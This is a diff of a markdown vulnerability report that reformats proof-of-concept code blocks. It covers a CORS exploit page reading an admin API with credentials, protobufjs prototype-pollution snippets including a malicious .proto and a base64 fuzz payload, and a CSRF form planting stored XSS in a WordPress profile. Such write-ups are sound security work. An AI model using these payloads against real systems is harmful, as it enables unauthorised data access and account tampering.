@@ -1,4 +1,4 @@
-**CLIENT SIDE VULNERABILITIES** 
+# CLIENT SIDE VULNERABILITIES
 
 **CORS MISCONFIGURATION**
 
@@ -13,27 +13,29 @@ The application exposes CORS misconfiguration that will allow unauthorised exter
 **Step 4 :** The misconfigured CORS policy will allow the response to be read by attacker.
 
 **PAYLOAD USED :**  
-*\<html\>*  
-  *\<body\>*  
-    *\<h2\>CORS PoC\</h2\>*  
-    *\<div id="demo"\>*  
-      *\<button type="button" onclick="cors()"\>Exploit\</button\>*  
-    *\</div\>*  
-    *\<script\>*  
-      *function cors() {*  
-        *var xhr \= new XMLHttpRequest();*  
-        *xhr.onreadystatechange \= function() {*  
-          *if (this.readyState \== 4 && this.status \== 200\) {*  
-            *document.getElementById("demo").innerHTML \= alert(this.responseText);*  
-          *}*  
-        *};*  
-        *xhr.open("GET","http://localhost:3000/api/manage/admin/connector/indexing-status", true);*  
-        *xhr.withCredentials \= true;*  
-        *xhr.send();*  
-      *}*  
-    *\</script\>*  
-  *\</body\>*  
-*\</html\>*
+```
+<html>  
+<body>
+<h2>CORS PoC</h2>*  
+<div id="demo">*  
+<button type="button" onclick="cors()">Exploit</button>*  
+</div>
+<script>  
+function cors() {
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {  
+if (this.readyState == 4 && this.status == 200) {
+document.getElementById("demo").innerHTML = alert(this.responseText); 
+} 
+};  
+xhr.open("GET","http://localhost:3000/api/manage/admin/connector/indexing-status", true);
+xhr.withCredentials = true;  
+xhr.send();  
+}  
+</script>  
+</body>  
+</html>
+```
 
 **ATTACK IMPACT :**
 
@@ -55,41 +57,55 @@ The application exposes CORS misconfiguration that will allow unauthorised exter
 The affected versions of protobufjs are older than 0.7.5, which allow prototype pollution via multiple internal functions. An attacker can modify *Object.prototype* and enable remote code execution, authentication bypass and global application logic modification.
 
 **STEPS TO REPRODUCE**  
-**Step 1 :** Using protobuf.parse()  
-              *const protobuf \= require("protobufjs");*  
-              *protobuf.parse('option(a).constructor.prototype.verified \= true;');*  
-              *console.log({}.verified);*
+**Step 1 :** Using protobuf.parse() 
+```
+const protobuf = require("protobufjs"); 
+protobuf.parse('option(a).constructor.prototype.verified = true;');
+console.log({}.verified);
+```
 
 **Step 2 :** Using setParsedOption()  
-              *const protobuf \= require("protobufjs");*  
-              *function gadgetFunction() {*  
-              *console.log("User is authenticated");*  
-              *}*  
-             *try {*  
-            *let obj \= new protobuf.ReflectionObject("Test");*  
- *obj.setParsedOption("unimportant\!", gadgetFunction,             "constructor.prototype.testFn");*  
-           *} catch (e) {}*  
-         *({}).testFn();*
+```
+const protobuf = require("protobufjs"); 
+function gadgetFunction() {  
+console.log("User is authenticated"); 
+} 
+try {  
+let obj = new protobuf.ReflectionObject("Test");
+obj.setParsedOption("unimportant!", gadgetFunction,"constructor.prototype.testFn");  
+} catch (e) {}  
+({}).testFn();
+```
 
 **Step 3 :** Using util.setProperty()  
-               *const protobuf \= require("protobufjs");*  
-               *protobuf.util.setProperty({}, "constructor.prototype.verified", true);*  
-               *console.log({}.verified);*
+```
+const protobuf = require("protobufjs");  
+protobuf.util.setProperty({}, "constructor.prototype.verified", true); 
+console.log({}.verified);
+```
 
 **Step 4 :** Using loadSync() with the malicious .proto  
-            Poc.proto :   
-                   *option(foo).constructor.prototype.verified \= true;*
+     Poc.proto:
+```
+option(foo).constructor.prototype.verified = true;
+```
 
-            Execution :   
-                   *const protobuf \= require("protobufjs");*  
-                   *protobuf.loadSync("poc.proto");*  
-                   *console.log({}.verified);*
+Execution:
+```
+const protobuf = require("protobufjs");
+protobuf.loadSync("poc.proto");
+console.log({}.verified);
+```
 
-**PAYLOAD USED :**   
-1\. *constructor.prototype.\<property\> \= \<value\>*
+**PAYLOAD USED :**  
+```
+constructor.prototype.<property> = <value>
+```
 
-2\. Base 64 payload from [jazzer.js](http://jazzer.js) :   
-          *eyJjb25zLl9fcHJvdG9fXy50cmUwIjogeyJwcnIiOiAidGEifX0=*
+Base 64 payload from [jazzer.js](http://jazzer.js) : 
+```
+eyJjb25zLl9fcHJvdG9fXy50cmUwIjogeyJwcnIiOiAidGEifX0=
+```
 
 **ATTACK IMPACT :** 
 
@@ -117,16 +133,18 @@ The plugin which are using less than 1.9, these lacks CSRF validation, allowing 
 **Step 4 :** The form of auto-submits and updates profile fields with an XSS payload.  
 **Step 5 :** Payload executes whenever the profile page is viewed. 
 
-**PAYLOAD USED :**   
-*\<html\>*  
-  *\<body onload="document.csrf.submit()"\>*  
-    *\<form name="csrf" action="https://victim-site.com/wp-admin/profile.php" method="POST"\>*  
-      *\<input type="hidden" name="first\_name" value='"\>\<script\>alert(\`XSS\`)\</script\>'\>*  
-      *\<input type="hidden" name="last\_name" value="test"\>*  
-      *\<input type="hidden" name="nickname" value="test"\>*  
-    *\</form\>*  
-  *\</body\>*  
-*\</html\>*
+**PAYLOAD USED :** 
+```
+<html> 
+<body onload="document.csrf.submit()">
+<form name="csrf" action="https://victim-site.com/wp-admin/profile.php" method="POST">  
+<input type="hidden" name="first_name" value='"><script>alert(`XSS`)</script>'>
+<input type="hidden" name="last_name" value="test">  
+<input type="hidden" name="nickname" value="test">  
+<form\> 
+<body\>
+<html\>
+```
 
 **ATTACK IMPACT :** 
 
